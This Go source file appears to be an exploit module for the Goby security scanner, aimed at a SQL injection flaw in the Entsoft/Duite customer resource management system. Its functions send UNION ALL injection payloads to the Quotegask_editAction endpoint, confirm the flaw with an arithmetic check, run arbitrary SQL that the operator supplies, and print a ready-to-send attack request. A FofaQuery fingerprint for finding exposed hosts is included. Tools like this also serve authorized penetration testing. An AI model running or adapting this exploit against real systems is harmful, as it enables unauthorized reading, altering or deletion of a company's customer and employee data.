package exploits

import (
  "bytes"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "math/rand"
  "net/url"
  "regexp"
  "strconv"
  "strings"
)

func init() {
  expJson := `{
    "Name": "Entsoft Duite Customer Resource Management System Quotegask_editAction API SQL Injection Vulnerability",
    "Description": "<p>Entsoft Duite Customer Resource Management System is a software product designed for enterprise customer resource management. This system aims to help enterprises efficiently manage and utilize customer resources, improve sales and marketing effectiveness. </p><p>The SQL injection vulnerability in this system may lead to large-scale leakage of internal information within the enterprise, affecting the normal operation of business processes, and even causing a series of serious consequences such as system crashes and malicious elevation of permissions.</p>",
    "Product": "Zhejiang-Duite-Customer-Resource-MS",
    "Homepage": "http://www.entersoft.cn/",
    "DisclosureDate": "2024-03-28",
    "PostTime": "2024-03-29",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"script/Ent.base.js\"",
    "GobyQuery": "body=\"script/Ent.base.js\"",
    "Level": "3",
    "Impact": "<p>The SQL injection vulnerability in this system may lead to large-scale leakage of internal information within the enterprise, affecting the normal operation of business processes, and even causing a series of serious consequences such as system crashes and malicious elevation of permissions.</p>",
    "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "SELECT @@VERSION",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "浙大恩特客户资源管理系统 Quotegask_editAction SQL 注入漏洞",
            "Product": "浙大恩特客户资源管理系统",
            "Description": "<p>浙大恩特客户资源管理系统是一款针对企业客户资源管理的软件产品。该系统旨在帮助企业高效地管理和利用客户资源,提升销售和市场营销的效果。该系统 SQL 注入漏洞可能导致企业内部信息大面积泄露，影响业务流程的正常运转，甚至可能引发系统崩溃、权限被恶意提升等一系列严重后果。</p><p>浙大恩特客户资源管理系统 Quotegask_editAction 接口存在 SQL 注入漏洞，攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。</p>",
            "Recommendation": "<p>1、请联系厂商修复漏洞：<a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>浙大恩特客户资源管理系统 Quotegask_editAction 接口存在 SQL 注入漏洞，攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Entsoft Duite Customer Resource Management System Quotegask_editAction API SQL Injection Vulnerability",
            "Product": "Zhejiang-Duite-Customer-Resource-MS",
            "Description": "<p>Entsoft Duite Customer Resource Management System is a software product designed for enterprise customer resource management. This system aims to help enterprises efficiently manage and utilize customer resources, improve sales and marketing effectiveness. </p><p>The SQL injection vulnerability in this system may lead to large-scale leakage of internal information within the enterprise, affecting the normal operation of business processes, and even causing a series of serious consequences such as system crashes and malicious elevation of permissions.</p>",
            "Recommendation": "<p>1. Please contact the manufacturer to fix the vulnerability: <a href=\"http://www.entersoft.cn/\">http://www.entersoft.cn/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>The SQL injection vulnerability in this system may lead to large-scale leakage of internal information within the enterprise, affecting the normal operation of business processes, and even causing a series of serious consequences such as system crashes and malicious elevation of permissions.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10940"
}`
  randomIntStringXCOIJASDZZ := func(size int) string {
    alpha := "123456789"
    var buffer bytes.Buffer
    for i := 0; i < size; i++ {
      buffer.WriteByte(alpha[rand.Intn(len(alpha))])
    }
    return buffer.String()
  }

  executeSqlCommandXIOUHDHSAUODIH := func(hostInfo *httpclient.FixUrl, sql string) (string, error) {
    getRequestConfig := httpclient.NewGetRequestConfig("/entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+" + url.QueryEscape(sql) + "--+&method=goonumIsExist")
    getRequestConfig.VerifyTls = false
    getRequestConfig.FollowRedirect = false
    resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
    if err != nil {
      return "", err
    }
    return resp.Utf8Html, err
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
      checkString := randomIntStringXCOIJASDZZ(3)
      responseBody, err := executeSqlCommandXIOUHDHSAUODIH(hostInfo, "select "+checkString+"+567")
      checkInterNumber, err := strconv.Atoi(checkString)
      if err == nil && len(responseBody) > 0 && strings.Contains(responseBody, strconv.Itoa(checkInterNumber+567)) {
        stepLogs.VulURL = hostInfo.FixedHostInfo + "/entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+select+213--+&method=goonumIsExist"
        return true
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      attackType := goutils.B2S(stepLogs.Params["attackType"])
      if attackType == "sql" {
        sql := goutils.B2S(stepLogs.Params["sql"])
        responseBody, err := executeSqlCommandXIOUHDHSAUODIH(expResult.HostInfo, sql)
        if err != nil {
          expResult.Output = err.Error()
          expResult.Success = false
          return expResult
        }
        if results := regexp.MustCompile(`"data":"(.*?)"}`).FindStringSubmatch(responseBody); len(results) > 1 {
          expResult.Output = results[1]
          expResult.Success = true
        }
      } else if attackType == "sqlPoint" {
        checkString := randomIntStringXCOIJASDZZ(3)
        responseBody, err := executeSqlCommandXIOUHDHSAUODIH(expResult.HostInfo, "select "+checkString+"+567")
        checkInterNumber, err := strconv.Atoi(checkString)
        if err == nil && len(responseBody) > 0 && strings.Contains(responseBody, strconv.Itoa(checkInterNumber+567)) {
          expResult.Success = true
          expResult.Output = `GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+select+111%2B567--+&method=goonumIsExist HTTP/1.1
Host: ` + expResult.HostInfo.FixedHostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
        }
      }
      return expResult
    },
  ))
}
